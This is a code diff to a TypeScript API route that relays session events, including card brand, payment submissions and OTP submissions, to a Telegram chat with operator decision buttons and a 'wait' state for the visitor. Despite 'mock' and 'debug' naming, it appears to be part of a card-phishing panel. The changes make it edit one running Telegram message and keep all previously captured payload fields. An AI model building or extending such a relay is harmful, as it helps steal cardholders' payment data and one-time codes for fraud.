@@ -344,22 +344,30 @@ async function sendTelegram(payload: Record<string, unknown>, options: { withBut
   if (!chatId) return { sent: false, skipped: 'telegram-env-missing' };
   const sessionId = String(payload.sessionId || '');
   const brand = String(payload.brand || (payload.mockCard as { brand?: string } | undefined)?.brand || 'visa');
+  if (sessionId) await restoreRouteState(sessionId);
   const session = sessionId ? getSession(sessionId) : undefined;
-  if (session?.lastTelegramChatId != null && typeof session.lastTelegramMessageId === 'number') {
-    await telegramApi('editMessageReplyMarkup', {
-      chat_id: session.lastTelegramChatId,
-      message_id: session.lastTelegramMessageId,
-      reply_markup: { inline_keyboard: [] },
-    });
-  }
+  const text = formatTelegramMessage(payload);
   const message: Record<string, unknown> = {
     chat_id: chatId,
-    text: formatTelegramMessage(payload),
+    text,
     disable_web_page_preview: true,
   };
   if (options.withButtons ?? true) {
     message.reply_markup = keyboard(sessionId, brand);
     await ensureTelegramWebhook();
+  }
+  const existingId = typeof session?.lastTelegramMessageId === 'number' ? session.lastTelegramMessageId : 0;
+  if (existingId > 0) {
+    const edited = await telegramApi('editMessageText', {
+      chat_id: session?.lastTelegramChatId ?? chatId,
+      message_id: existingId,
+      text,
+      disable_web_page_preview: true,
+      reply_markup: message.reply_markup || { inline_keyboard: [] },
+    });
+    if (edited.ok || /message is not modified/i.test(edited.description)) {
+      return { sent: true, edited: true };
+    }
   }
   const result = await telegramApi('sendMessage', message);
   const sentMessageId = Number((result.result as { message_id?: number } | undefined)?.message_id);
@@ -492,6 +500,7 @@ export const POST: APIRoute = async ({ request }) => {
 
   const sessionId = cleanSessionId(body.sessionId);
   const session = getSession(sessionId);
+  await restoreRouteState(sessionId);
   const previousPayload = session.payload;
   const previousMeta = objectValue(previousPayload?.meta);
   const previousMetaOtp = objectValue(previousPayload?.metaOtp);
@@ -510,16 +519,26 @@ export const POST: APIRoute = async ({ request }) => {
     await persistRouteState(sessionId, session.decision);
   }
 
+  const previousCpayload = objectValue(previousMeta?.cpayload);
+  const incomingCpayload = objectValue(incomingMeta?.cpayload);
+  const meta = {
+    ...(previousMeta || {}),
+    ...(incomingMeta || {}),
+    cpayload: {
+      ...(previousCpayload || {}),
+      ...(incomingCpayload || {}),
+    },
+  };
   const payload = {
     sessionId,
     event,
     route: String(body.route || ''),
     createdAt: new Date().toISOString(),
     brand,
-    meta: incomingMeta || previousMeta || {},
+    meta,
     metaOtp: incomingMetaOtp || previousMetaOtp || {},
     action: event === 'PAYMENT_SUBMIT' || event === 'OTP_SUBMIT' ? 'wait' : 'ack',
-    mockCard,
+    mockCard: mockCard || previousPayload?.mockCard,
   };
 
   console.info('[debug-api]', payload);
